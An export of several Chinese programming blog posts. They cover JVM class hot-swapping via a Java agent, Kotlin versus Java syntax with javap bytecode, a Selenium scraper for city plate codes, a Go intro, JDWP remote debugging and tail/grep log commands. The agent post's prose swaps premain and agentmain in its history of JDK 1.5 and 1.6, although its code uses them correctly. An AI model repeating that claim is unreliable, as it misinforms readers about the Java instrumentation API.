    <content type="text"><![CDATA[将程序打包成jar包提测，然后测试小姐姐过来跟你说程序有bug的时候就不得不改完然后重新打一个jar包部署到测试服重新运行。有时候甚至只是改了一个类中的某一行代码，就要将整个工程重新打包上传提测，这样不仅非常麻烦而且还浪费了很多时间。既然只是改了一小部分的代码，那我们试想一下能不能动态替换JVM中的的某个类的字节码，达到每次只要更新修改的代码就可以自动进行动态替换，不需要做打包和重启的工作。经过验证发现这种方案是可行的。 我们在本地开发环境编写代码的时候，只要IDE设置了自动刷新，就可以达到不需要重启项目就直接加载修改后的代码的效果。不需要重启项目可以继续调试，一直好奇是如何实现的，经过研究发现，这个功能其实是IDE使用了代理机制去替我们实现的。无论是运行在Tomcat中的项目，还是像Spring Boot这样可以打成jar包运行的项目（内置了Tomcat），在本地开发环境编写的时候都会将class输出到指定目录，IDE实质上是通过检测代码的变化然后编译修改的代码到指定目录的class文件，代理检测到class变化，就把变化的class重新加载到JVM中，实现动态的更新程序。 只要自己编写一个实现网络传输的代理工具，就可以实现不打包不重启项目，直接远程热更新。 在JDK1.5中就引入了agentmain实现了静态代理，需要在启动目标程序时在命令行指定代理jar，这种方式一般不会在生产环境中使用。在JDK1.6中又引入了premain，实现了动态代理，可以不用在目标程序启动时指定，而是以独立的代理程序获取目标程序的JVM的pid动态attach。 其实JVM提供了很多底层API和工具，可以对任意的ASM进行各种操作，只要你对JVM研究的足够深入，脑洞足够大，就可以实现任意你想实现的功能。就像“PHP是世界上最好的语言 ———《PHP官方文档》”，在JVM层可以对字节码进行操作就可以达到动态脚本语言的功能。 下面演示一下如何动态更新JVM中的class1.新建一个普通的工程 AgentDemo新建一个User类并重写toString方法返回User对象的信息123456789101112131415161718/** * 用户信息实体类 * @author 蓝士钦 */public class User &#123; private String name; private Integer age; public User(String name, Integer age) &#123; this.name = name; this.age = age; &#125; @Override public String toString() &#123; return "姓名："+name +" 年龄："+age; &#125;&#125; 在Main函数中使用循环每隔3秒打印一次User对象信息123456789101112131415161718/** * 程序入口类 * @author 蓝士钦 */public class Main &#123; public static void main(String[] args) &#123; while (true) &#123; System.out.println(new User("蓝士钦", 23)); try &#123; Thread.sleep(3000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125;&#125; 将程序打包成jar包运行1java -jar AgentDemo.jar 程序每隔3秒输出一次User对象信息 接下来使用代理类在不重启目标程序的情况下动态替换User类，通过检测到User.class文件的更新将对应字节码从新加载到JVM中。新建工程LoadAgent。代理程序需要两个文件，一个是用作代理的包含premain方法的java文件，另一个是MANIFEST.MF文件，用来声明premain方法所在的java文件的位置。新建LoadAgent.java123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990package com.lanshiqin.agent;import java.io.DataInputStream;import java.io.File;import java.io.FileInputStream;import java.lang.instrument.ClassDefinition;import java.lang.instrument.Instrumentation;/** * 加载代理类，用来动态替换jvm中的class * * @author 蓝士钦 */public class LoadAgent &#123; public static void premain(String agentArgs, Instrumentation instrumentation) &#123; try &#123; // 监视的User.class所在的路径，此处为了示例演示，先直接硬编码，只监视指定目录下User.class的变化 File f = new File("/Users/lanshiqin/Desktop/out/User.class"); // 开启一个线程，用来监视文件变化 ClassFileWatcher watcher = new ClassFileWatcher(instrumentation, f); watcher.start(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; /** * Class文件监视线程类，用来检测class文件更新 */ private static class ClassFileWatcher extends Thread &#123; private File classFile; private long lastModified; private Instrumentation instrumentation; private boolean firstRun = true; ClassFileWatcher(Instrumentation instrumentation, File classFile) &#123; this.classFile = classFile; this.instrumentation = instrumentation; lastModified = classFile.lastModified(); &#125; @Override public void run() &#123; // 循环检测 while (true) &#123; // 判断是否第一次运行，或者文件最后的修改时间与上一次时间不一致时 if (firstRun || (lastModified != classFile.lastModified())) &#123; firstRun = false; // 更新文件最后修改时间 lastModified = classFile.lastModified(); // 重新加载class reDefineClass(instrumentation, classFile); &#125; try &#123; // 每隔一秒休眠一次 Thread.sleep(1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125; &#125; /** * 重新加载Class * @param instrumentation jvm的监视对象 * @param classFile 类文件 */ private static void reDefineClass(Instrumentation instrumentation, File classFile) &#123; byte[] reporterClassFile = new byte[(int) classFile.length()]; DataInputStream in; try &#123; // 读入class文件实例化数据输入流 in = new DataInputStream(new FileInputStream(classFile)); in.readFully(reporterClassFile); in.close(); // 通过读入的class数据输入流实例化类定义对象 ClassDefinition reporterDef = new ClassDefinition(Class.forName("com.lanshiqin.demo.User"), reporterClassFile); // 使用jvm监视对象重新定义类 instrumentation.redefineClasses(reporterDef); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 在META-INF目录下的MANIFEST.MF文件中指定 Premain-Class为我们编写的LoadAgent123Manifest-Version: 1.0Premain-Class: com.lanshiqin.agent.LoadAgentCan-Redefine-Classes: true Can-Redefine-Classes: true 是必须要声明的，否则在instrumentation.redefineClasses的时候会抛出异常。 完成后将代理程序打包成jar文件 LoadAgent.jar。 在执行目标程序AgentDemo时，通过-javaagent:xxx.jar指定代理jar，其中xxx为代理jar的文件名。1java -javaagent:LoadAgent.jar -jar AgentDemo.jar 发现控制台现在还是按照jar中的程序在不停的输出编辑User类的toString方法，新增一行输出语句，修改返回的字符串12345678910111213141516171819/** * 用户信息实体类 * @author 蓝士钦 */public class User &#123; private String name; private Integer age; public User(String name, Integer age) &#123; this.name = name; this.age = age; &#125; @Override public String toString() &#123; System.out.println("新增的输出语句"); return "我的名字是："+name +" 今年："+age +"岁"; &#125;&#125; 手动将User.java 编译成User.class1javac User.java 手动将生成的User.class复制到指定目录下，观察此时控制台输出的内容 发现我们更新替换了User.class后，原先JVM中的User.class被实时重新加载了，并且最新修改的代码已经实时生效，很酷有没有😎。 上面的示例采用的是静态代理的方式，需要运行目标程序时通过指定参数来运行。一般正式的环境下不会采用这种方式去运行，更多的我们可以考虑采用动态代理的方式。使用独立运行的代理程序，获取目标JVM所在的pid，然后将代理jar动态attach到JVM上。代理类中使用agentmain方法123public static void agentmain(String agentArgs, Instrumentation instrumentation)&#123; // TODO 动态代理&#125; 在入口函数中通过目标JVM的pid，动态的将代理jar attach到目标JVM上。12VirtualMachine virtualMachine = VirtualMachine.attach(pid);virtualMachine.loadAgent("LoadAgent.jar"); 在MANIFEST.MF中指定 Agent-Class:为agentmain方法所在的代理类，指定Main入口函数所在的类123Manifest-Version: 1.0Agent-Class: com.lanshiqin.agent.LoadAgentMain-Class: com.lanshiqin.attach.AttachMain 也许你会觉得采用静态代理，开启一个线程去监听某个class变化的方式很low，确实很low。这里仅仅作为简单的示例演示。我的想法是后续结合服务的做版本控制，比如git提交后使用webhooks触发代理程序将所有修改的class重新加载到JVM中。这篇文章参考了前人的思路，阿里其实已经开源了一个非常完备的解决方案JVM-Sandbox，不仅仅是动态更新JVM中的Class，而且对JVM做了很多高级的操作，比如动态非侵入AOP，有兴趣的可以查阅相关文章 https://mp.weixin.qq.com/s/Nn7Yl6UzRpWnSleKUss8Sw 阿里的JVM沙箱很强大，从中可以学到很多，但我并不需要那么复杂的功能。我想要的很简单，就是想Java程序能够像PHP这类动态脚本程序一样，写完直接刷新，可以不需要重启快速更新到测试服，在JVM层不需要再提什么打包部署，而是可以直接操作Class达到任意功能。 Tomcat的启动和Spring的启动都各自实现了自己的ClassLoad，他们通过破坏双亲委派模式，达到相对高级的操作方式。动态替换JVM中的Class还有很多要深入挖的地方，在后续的文章中会继续记录。 结合版本控制，通过代理动态的替换JVM中的Class，实现项目提测的零打包零部署。我会持续完善我的“雷神之锤”这个项目 https://github.com/lanshiqin/Mjolnir 欢迎Start Fork]]></content>
      <categories>
        <category>JVM</category>
      </categories>
      <tags>
        <tag>JVM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Kotlin提高开发效率]]></title>
    <url>%2Fa8b16990%2F</url>
    <content type="text"><![CDATA[Kotlin是现代跨平台的静态类型程序设计语言，不仅仅是Android官方支持的开发语言，同时在Web后端也在大量的使用。就我目前的工作而言，已经在完全使用Kotlin来编写基于Spring Boot的后端服务。为什么要使用Kotlin来开发应用？主要是因为它百分之百兼容Java，可以编译成JVM的字节码。Java的各种第三方库和Spring生态成为企业大型应用开发的最佳方案，使用Kotlin可以提高开发效率。 也许是一个时代流行一个语法，好的概念总会被推进，无关语言。最近对比了同样流行的Go语言，发现这两者的语法有异曲同工之处。尤其是Kotlin目前还在试验阶段的协程就和Go的协程非常像，更像是相互借鉴的感觉。kotlin的main函数输出hello，world非常精简123fun main(args: Array&lt;String&gt;) &#123; println("Hello, world!")&#125; kotlin同样借鉴了动态语言，如python的一些语法比如要过滤掉集合中能被2整除的数123456fun main(args: Array&lt;String&gt;) &#123; val numbers = listOf(1, 2, 3) println(numbers.filter(::isOdd))&#125;fun isOdd(x: Int) = x % 2 != 0 kotlin有非常多的新特性，具体可以查阅官网教程，此处不再重复啰嗦。 先从常见的语法进行分析关于变量的使用Java1String str = null; Kotlin1var str: String?=null 也许你会说仅仅是把变量声明放变量名后面而已，方便在哪？除了不用写封号以外，我怎么感觉还多写了？别急，Kotlin可以这样1var str = "this is String Test" 自动类型推断，无需显示声明类型也许你觉得自动类型推断不过如此？别急，看看下面这段代码123456// 获取用户信息集合val userList = userService.userList// 遍历用户for (user in userList)&#123; println(user)&#125; 调用userService的userList方法，将调用的返回值赋值给变量userList,无需指定变量类型，Kotlin将会自动推断，包括变量循环时也无需声明变量类型，全部都会进行自动推断。调用的方法没有参数，所以直接写方法名即可。如果是Java，你需要这样写1234List&lt;User&gt; userList = userService.getUserList();for (User user : userList)&#123; System.out.println(user);&#125; Java需要为接收的变量指定变量类型，你觉得还不够？接着往下看 关于方法的使用在java中，定义一个方法并且返回字符串123public String getInfoString()&#123; return "this is String Test";&#125; 在kotlin中123fun getInfoString(): String &#123; return "this is String Test"&#125; Kotlin使用fun关键字定义一个方法，方法返回类型在方法的括号后面用 ：加类型也许你会觉得这和Java没差多少啊，别急，Kotlin还可以这样1fun getInfoString() = "this is String Test" 方法也支持自动类型推断，够精简了吧？什么？还不够精简？那再对比一下java和kotlin比较两个数的大小，返回大的那个数12345678// 老实人的写法public int max(int a, int b)&#123; if (a&gt;b)&#123; return a; &#125;else&#123; return b; &#125;&#125; kotlin的写法1fun max(a: Int, b: Int) = if (a &gt; b) a else b 除了方法返回值类型自动推断，连流程控制语句里的retrun都不需要也许你觉得也就一般般？还不够？那就接着往下看 流程控制语句123456789101112131415161718192021public static void main(String[] args) &#123; String language; if (args.length == 0) &#123; language = "EN"; &#125; else &#123; language = args[0]; &#125; switch (language) &#123; case "EN": System.out.println("Hello!"); break; case "CN": System.out.println("你好"); break; default: System.out.println("抱歉，支持当前语言" + language + "的输出"); break; &#125; &#125; 在java中，你会发现你写了很多重复的代码，比如case和break关键字，并且整个代码变得非常的沉长。Kotlin可以这么写12345678fun main(args: Array&lt;String&gt;)&#123; val language = if (args.isEmpty()) "EN" else args[0] println(when (language)&#123; "EN" -&gt; "Hello!" "CN" -&gt; "你好!" else -&gt; "抱歉，支持当前语言$language 的输出" &#125;)&#125; Kotlin使用when代替Java中的switch语句，case匹配可以和lambada表达式一样精简的写法，可以在println中直接输出整个表达式，字符串内部可以使用美元符号$加变量名进行变量表达式输出。 也许你觉得其实也就这样而已？那继续往下看！123456789fun cases(obj: Any)&#123; when(obj)&#123; 1 -&gt; println("One") "Hello" -&gt; println("你好") is Long -&gt; println("Long") !is String -&gt; println("不是字符串") else -&gt; println("未知") &#125;&#125; 在Kotlin中使用Any表示Object类型，when语句比java的switch语句要强大很多。如果是Java中去做匹配Object类型的操作,需要swtich case中用instanceof去匹配，java代码我已经无力写下去了1//java略... 下面来分析主要的几个部分，Kotlin简洁语法的背后到底为我们做了什么？Kotlin编译成JVM字节码后到底是什么样的？关于简单的语法糖我们可以直接在IDEA一层一层往下翻，另外一些编译时生成的则需要通过反编译字节码。 接下来分析一个例子：用Java来写一个POJO类，类里面有3个私有的成员变量，然后要提供公共的get\set方法。User.java123456789101112131415161718192021222324252627282930313233343536373839public class User &#123; /** * 姓名 */ private String name; /** * 性别 */ private String sex; /** * 年龄 */ private Integer age; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public String getSex() &#123; return sex; &#125; public void setSex(String sex) &#123; this.sex = sex; &#125; public Integer getAge() &#123; return age; &#125; public void setAge(Integer age) &#123; this.age = age; &#125;&#125; 通过属性私有，方法公开的方式来对类进行封装，代码很多，而且很繁琐有没有？虽然get/set可以自动生成，但其实这种模板化的代码干脆就不要出现在代码里，除非要单独封装某个属性值 使用Kotlin来写POJO类就变得非常精简，只需要几行就可以了，在类前使用data关键字修饰，类体用()小括号包裹，里面定义成员变量即可。编译后的class文件会自动为我们添加上属性的get/set方法，并且重写toString()、hashCode()、equals()方法，以及构造函数和一些特殊方法。User.kt12345data class User( var name: String?=null, var sex: String?=null, var age: Int?=null) 口说无凭，你说有get/set就真的有?真的会生成带参和无参的构造函数？凭什么？为了一探究竟，接下来直接反编译class字节码，看看Kotlin写的代码对应的JVM字节码到底是什么样的 为了翻遍查看对应类的信息，这里使用javap -c 并将class文件反编译后的数据输出到一个txt文件上1javap -c User.class &gt; User.txt 反编译后的class字节码文件 User.txt内容如下123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248Compiled from "User.kt"public final class com.lanshiqin.springboot.User &#123; public final java.lang.String getName(); Code: 0: aload_0 1: getfield #11 // Field name:Ljava/lang/String; 4: areturn public final void setName(java.lang.String); Code: 0: aload_0 1: aload_1 2: putfield #11 // Field name:Ljava/lang/String; 5: return public final java.lang.String getSex(); Code: 0: aload_0 1: getfield #20 // Field sex:Ljava/lang/String; 4: areturn public final void setSex(java.lang.String); Code: 0: aload_0 1: aload_1 2: putfield #20 // Field sex:Ljava/lang/String; 5: return public final java.lang.Integer getAge(); Code: 0: aload_0 1: getfield #27 // Field age:Ljava/lang/Integer; 4: areturn public final void setAge(java.lang.Integer); Code: 0: aload_0 1: aload_1 2: putfield #27 // Field age:Ljava/lang/Integer; 5: return public com.lanshiqin.springboot.User(java.lang.String, java.lang.String, java.lang.Integer); Code: 0: aload_0 1: invokespecial #34 // Method java/lang/Object."&lt;init&gt;":()V 4: aload_0 5: aload_1 6: putfield #11 // Field name:Ljava/lang/String; 9: aload_0 10: aload_2 11: putfield #20 // Field sex:Ljava/lang/String; 14: aload_0 15: aload_3 16: putfield #27 // Field age:Ljava/lang/Integer; 19: return public com.lanshiqin.springboot.User(java.lang.String, java.lang.String, java.lang.Integer, int, kotlin.jvm.internal.DefaultConstructorMarker); Code: 0: iload 4 2: iconst_1 3: iand 4: ifeq 12 7: aconst_null 8: checkcast #37 // class java/lang/String 11: astore_1 12: iload 4 14: iconst_2 15: iand 16: ifeq 24 19: aconst_null 20: checkcast #37 // class java/lang/String 23: astore_2 24: iload 4 26: iconst_4 27: iand 28: ifeq 36 31: aconst_null 32: checkcast #39 // class java/lang/Integer 35: astore_3 36: aload_0 37: aload_1 38: aload_2 39: aload_3 40: invokespecial #41 // Method "&lt;init&gt;":(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)V 43: return public com.lanshiqin.springboot.User(); Code: 0: aload_0 1: aconst_null 2: aconst_null 3: aconst_null 4: bipush 7 6: aconst_null 7: invokespecial #43 // Method "&lt;init&gt;":(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;ILkotlin/jvm/internal/DefaultConstructorMarker;)V 10: return public final java.lang.String component1(); Code: 0: aload_0 1: getfield #11 // Field name:Ljava/lang/String; 4: areturn public final java.lang.String component2(); Code: 0: aload_0 1: getfield #20 // Field sex:Ljava/lang/String; 4: areturn public final java.lang.Integer component3(); Code: 0: aload_0 1: getfield #27 // Field age:Ljava/lang/Integer; 4: areturn public final com.lanshiqin.springboot.User copy(java.lang.String, java.lang.String, java.lang.Integer); Code: 0: new #2 // class com/lanshiqin/springboot/User 3: dup 4: aload_1 5: aload_2 6: aload_3 7: invokespecial #41 // Method "&lt;init&gt;":(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)V 10: areturn public static com.lanshiqin.springboot.User copy$default(com.lanshiqin.springboot.User, java.lang.String, java.lang.String, java.lang.Integer, int, java.lang.Object); Code: 0: iload 4 2: iconst_1 3: iand 4: ifeq 12 7: aload_0 8: getfield #11 // Field name:Ljava/lang/String; 11: astore_1 12: iload 4 14: iconst_2 15: iand 16: ifeq 24 19: aload_0 20: getfield #20 // Field sex:Ljava/lang/String; 23: astore_2 24: iload 4 26: iconst_4 27: iand 28: ifeq 36 31: aload_0 32: getfield #27 // Field age:Ljava/lang/Integer; 35: astore_3 36: aload_0 37: aload_1 38: aload_2 39: aload_3 40: invokevirtual #53 // Method copy:(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Lcom/lanshiqin/springboot/User; 43: areturn public java.lang.String toString(); Code: 0: new #56 // class java/lang/StringBuilder 3: dup 4: invokespecial #57 // Method java/lang/StringBuilder."&lt;init&gt;":()V 7: ldc #59 // String User(name= 9: invokevirtual #63 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 12: aload_0 13: getfield #11 // Field name:Ljava/lang/String; 16: invokevirtual #63 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 19: ldc #65 // String , sex= 21: invokevirtual #63 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 24: aload_0 25: getfield #20 // Field sex:Ljava/lang/String; 28: invokevirtual #63 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 31: ldc #67 // String , age= 33: invokevirtual #63 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 36: aload_0 37: getfield #27 // Field age:Ljava/lang/Integer; 40: invokevirtual #70 // Method java/lang/StringBuilder.append:(Ljava/lang/Object;)Ljava/lang/StringBuilder; 43: ldc #72 // String ) 45: invokevirtual #63 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 48: invokevirtual #74 // Method java/lang/StringBuilder.toString:()Ljava/lang/String; 51: areturn public int hashCode(); Code: 0: aload_0 1: getfield #11 // Field name:Ljava/lang/String; 4: dup 5: ifnull 14 8: invokevirtual #78 // Method java/lang/Object.hashCode:()I 11: goto 16 14: pop 15: iconst_0 16: bipush 31 18: imul 19: aload_0 20: getfield #20 // Field sex:Ljava/lang/String; 23: dup 24: ifnull 33 27: invokevirtual #78 // Method java/lang/Object.hashCode:()I 30: goto 35 33: pop 34: iconst_0 35: iadd 36: bipush 31 38: imul 39: aload_0 40: getfield #27 // Field age:Ljava/lang/Integer; 43: dup 44: ifnull 53 47: invokevirtual #78 // Method java/lang/Object.hashCode:()I 50: goto 55 53: pop 54: iconst_0 55: iadd 56: ireturn public boolean equals(java.lang.Object); Code: 0: aload_0 1: aload_1 2: if_acmpeq 59 5: aload_1 6: instanceof #2 // class com/lanshiqin/springboot/User 9: ifeq 61 12: aload_1 13: checkcast #2 // class com/lanshiqin/springboot/User 16: astore_2 17: aload_0 18: getfield #11 // Field name:Ljava/lang/String; 21: aload_2 22: getfield #11 // Field name:Ljava/lang/String; 25: invokestatic #86 // Method kotlin/jvm/internal/Intrinsics.areEqual:(Ljava/lang/Object;Ljava/lang/Object;)Z 28: ifeq 61 31: aload_0 32: getfield #20 // Field sex:Ljava/lang/String; 35: aload_2 36: getfield #20 // Field sex:Ljava/lang/String; 39: invokestatic #86 // Method kotlin/jvm/internal/Intrinsics.areEqual:(Ljava/lang/Object;Ljava/lang/Object;)Z 42: ifeq 61 45: aload_0 46: getfield #27 // Field age:Ljava/lang/Integer; 49: aload_2 50: getfield #27 // Field age:Ljava/lang/Integer; 53: invokestatic #86 // Method kotlin/jvm/internal/Intrinsics.areEqual:(Ljava/lang/Object;Ljava/lang/Object;)Z 56: ifeq 61 59: iconst_1 60: ireturn 61: iconst_0 62: ireturn&#125; 可以看到使用data修饰的POJO类的Kotlin代码编译后，不仅仅默认为我们生成了get/set方法，还重写了toString()、hashCode()、equals()方法,还有构造函数和特有的方法，另外我们还发现了类和所有的方法默认都是使用final作为修饰符的，这些特性对于快速开发非常有用。其余的字节码指令部分后续再分析，挖个坑，今天先写到这。]]></content>
      <categories>
        <category>杂谈</category>
      </categories>
      <tags>
        <tag>Kotlin</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Python自动化获取全国每个城市的车牌代码]]></title>
    <url>%2F675a168f%2F</url>
    <content type="text"><![CDATA[最近有这样一需求，需要获取12123交管查询网站上的全国每个城市对应的城市id和车牌代码。最初的想法是直接用Python写个爬虫，遍历每个城市，然后用Xpath提取DOM节点数据就好了。然而在实际操作中发现城市id的DOM节点如果用简单的获取网页数据的爬虫是取不到id值的，这个城市id值必须用浏览器打开的方式去访问，然后网站的js脚本再动态的将城市id插入DOM节点。于是乎想到了用自动化测试工具来做，使用selenium库来操作webdriver，驱动Chrome浏览器进行自动化操作。 由于这个网站有一点特殊，并没有在同一个页面中有全部城市的id和车牌代码，每个城市都是一个单独的二级域名链接。并且城市id使用js动态加载，所以这里就用蠢一点的方法，自动获取到每个城市的链接,然后用浏览器自动化模式去逐个访问再Xpath提取出内容。 当然，这里的重复劳动力交给计算机就好，我们只需要把程序写好。 使用Chrome浏览器打开12123的城市列表选择页面 http://m.12123.com/city.html右键，审查元素，发现所有的城市都在ul 的 li标签下。只需要把li的元素Xpath拷贝出来，提取到城市列表后遍历每个列表的链接，再用浏览器自动化去访问每个城市的链接，最后用相同的方法提取出数据即可。拷贝出来的Xpath如下1/html/body/div[2]/div[3]/ul/li 用Xpath的方式有个好处就是不需要写复杂的正则表达式就可以快速提取到DOM元素的数据。 我要实现的功能： 自动获取全国所有的城市对应的id和车牌代码 将获取到的数据写入到文件，输出为SQL的insert语句 全部代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162"""12123.com 交管查询助手获取所有的 城市名称+城市车牌代码+城市id生成SQL insert语句create by 蓝士钦 2018-06-10"""import requestsfrom lxml import etreefrom selenium import webdriverimport datetime# 12123.com 交管查询网站移动版网址HOST_URL = 'http://m.12123.com'def get_city_info(file_name): # 请求城市列表页面，并用xpath提取所有的城市列表集合 html = requests.get(HOST_URL + '/city.html') select = etree.HTML(html.text) content = select.xpath('/html/body/div[2]/div[3]/ul/li') # 打开指定文件，准备将请求到的数据写入到文件中 file = open(file_name, 'w') # 遍历所有的城市列表集合 for index, value in enumerate(content): # 提取当前城市列表中的a标签的城市链接 item = value.xpath('/html/body/div[2]/div[3]/ul/li[' + str(index) + ']/a/@href') for city_path in item: city_url = HOST_URL + city_path print('当前城市链接：' + city_url) try: # 打开Chrome浏览器，自动化访问城市链接 browser = webdriver.Chrome() browser.get(url=city_url) # 提取城市名称、城市车牌代码、城市id city_name = browser.find_element_by_xpath('/html/body/div[4]/div[1]/a/span').text car_num_pre = browser.find_element_by_xpath('//*[@id="txtAbbr"]').text + browser.find_element_by_xpath( '//*[@id="txtInitial"]').text city_id = browser.find_element_by_xpath('//*[@id="cityId"]').get_attribute('value') print('城市名称:' + city_name + ' 车牌代码:' + car_num_pre + ' 城市id:' + city_id) # 写入文件 file.writelines("insert into city_info ('city_name','car_num_pre','city_id') " + "values ('" + city_name + "','" + car_num_pre + "','" + city_id + "');\n") # 刷新缓冲区，将缓冲区数据写入文件，防止缓冲区有大量待写入数据时突然断电造成数据丢失 file.flush() # 关闭浏览器 browser.close() except: print('获取城市信息时发生异常') continue # 关闭文件流 file.close()if __name__ == '__main__': start_time = datetime.datetime.now() # 获取城市名称、车牌代码、城市id，并写入指定的sql文件中 get_city_info("city_info.sql") end_time = datetime.datetime.now() print('总用时:' + str((end_time - start_time).seconds) + '秒') 点击运行之后就可以放心的出去玩了😋控制台这边对每个链接的访问情况做了输出，如果有异常（网络超时）可以等全部结束后单独把异常的城市再跑一边即可。最后输出的SQL文件如下图： 注： 使用WebDriver前，需要将对应平台的webdriver驱动复制到系统环境变量中。]]></content>
      <categories>
        <category>Python 脚本</category>
      </categories>
      <tags>
        <tag>Python 自动化 脚本</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Golang造轮子]]></title>
    <url>%2F63d56522%2F</url>
    <content type="text"><![CDATA[造轮子最好的时间是“十年前”，其次是现在。计算机发展的历程中诞生了很多编程语言，每个语言都有各自的优缺点，就像吃饭用筷子喝汤用勺子，不同的语言在不同的领域都各有用途。无论是Python、PHP、还是Java、Kotlin、包括NodeJS以及目前我们所熟知的各种开发工具、操作系统、数据库、各种语言实现的框架，归根结底，他们的底层都是C/C++来编写的。现如今，我们有了可代替的方案，那就是Golang。 在学校的时候我的舍友推荐我学习Go，我浅显的学了一些，并接触了Go的web开发框架beego，beego支持热编译，启动日志输出的logo和Spring Boot很像。当时的感觉是这个语言很炫酷，可以很方便的在同一台计算机上直接交叉编译出其他平台的可执行程序。 当时对Go并不是很感冒，因为语法确实没什么亮点。自从工作之后开始大量的使用Kotlin来开发web，我发现这两个语言外表的语法非常像，这大概就是一个时代所流行的语法吧。 为什么选择用Go而不是其他，因为Go的协程调度做的非常棒，天生支持高并发，号称可以榨干机器性能。国内最大的云存储服务商七牛从创立之初就全栈在使用Go，我们所熟知的各种数据库存储的一般是结构化的数据，但是像图像视频等非结构化的数据想要在网络上高速传输和存储就必须用C/C++这种底层的语言对网络和数据进行操作，好在Go内置着强大的网络库，实现一个简单的资源服务器只变得很简单，开发人员要做的就是把逻辑写清楚，Go屏蔽了C/C++对内存手动管理的操作，这一点很像Java。 我发现会Kotlin后，写Go变动得心应手，语法的学习成本变得比较低。大胆假设一下，如果用Go写出了一个类似PHP解释器的程序，直接编译成各个平台的可执行程序，那么自己马上就可以拥有一个跨平台的脚本语言了。 先写一个Go的HelloWorldmain.go12345import "fmt"func main() &#123; fmt.Println("Hello, Golang")&#125; 写完可以直接 go run main.go 运行看效果。也可以直接 go build main.go 编译成二进制的可执行程序。Kotlin工作之余，Python自动化之外，我最喜欢的就是Go语言了。打算先用Go写个简单的http资源服务器。此处先挖个坑，有空再来埋。]]></content>
      <categories>
        <category>杂谈</category>
      </categories>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用远程Debug来分析问题]]></title>
    <url>%2F7c9947ec%2F</url>
    <content type="text"><![CDATA[经常会遇到这样一个场景，项目部署到测试服务器上，当测试人员测出一些问题的时候，我们需要通过运行日志来查找问题并解决。但是并不是所有的问题都可以通过日志来解决的，比如要查看用户请求的变量和对象的一些信息，我们就需要通过断点来调试查看。正常的断点一般是在本地，但其实远程服务器的程序用Debug模式运行，然后本地连接上Debug端口，直接在本地打断点进行远程调试也未尝不可。 1.将jar包部署到服务器，使用debug模式运行项目，并且指定端口号为50051java -Xdebug -Xrunjdwp:transport=dt_socket,address=5005,server=y,suspend=y -jar spring-boot-0.0.1-SNAPSHOT.jar &amp; 服务以Debug模式启动，Debug监听在5005端口1Listening for transport dt_socket at address: 5005 2.idea中添加一个Remote，主机地址和端口号写对应服务器的ip地址和Debug端口号Transport 选择Socket， Debugger mode 选择Attach 3.点击debug按钮，将会连接到远程debug端口，请求对应的接口,本地代码打上断点可以看到用户访问服务器上的接口，本地断点成功断到用户请求，然后就可以分析问题了。]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Java Debug</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用tail命令查看日志]]></title>
    <url>%2F58c57a9%2F</url>
    <content type="text"><![CDATA[没正式工作前，写项目的时候对对日志输出不怎么重视，一般出问题都直接去分析问题然后改程序。直到正式工作后才发现日志非常非常非常的重要！（重要的话说三遍），当线上系统有bug出问题的时候要快速准确的第一时间确定并找出问题，如果直接去分析代码无异于人工的大海捞针，累死都可能找不出问题。正确的姿势是要先根据什么时间段报的什么问题，使用tail命令快速过滤出日志，找出用户传的什么参数，报了什么异常，然后对应去解决。 -f 以监听文件的方式查看日志实时输出 （初始显示最后10条日志）1tail -f spring.log 通过 -n 加上要查看的条数1tail -f -n 9999 spring.log 不使用 -f 监听模式1tail -f -n 9999 spring.log 查找最近9999条日志记录，并使用grep管道命令 过滤出包含’2018-05-30 22:30’的日志信息1tail -n 9999 spring.log | grep '2018-05-30 22:30' 查找最近9999条日志记录，并使用grep管道命令 过滤出包含’用户签名：’的日志信息1tail spring.log | grep '用户签名：' 逆序显示最后10条日志1tail -r -n 10 spring.log]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在Spring Boot项目中使用Thymeleaf模板引擎]]></title>
    <url>%2F3714542b%2F</url>
